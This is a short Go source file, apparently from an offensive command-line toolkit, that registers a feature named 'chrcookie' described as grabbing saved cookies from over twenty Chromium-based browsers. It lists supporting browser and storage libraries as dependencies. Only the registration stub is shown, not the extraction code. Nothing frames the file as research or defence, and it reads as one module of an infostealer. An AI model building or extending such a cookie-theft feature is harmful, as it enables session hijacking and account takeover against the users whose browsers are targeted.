package features

import (
	. "mk3cli/s7cli/commands"
	. "mk3cli/s7cli/features"
)

func init() {
	FeatureList = append(FeatureList, Feature{
		Name:        "chrcookie",
		Description: "Grabs cookies saved in 20+ chromium browsers",
		Args:        []Arg{},
		Dependencies: []string{
			"chromium.lib.go",
			"browsers.lib.go",
			"storage.lib.go",
		},
	})
}
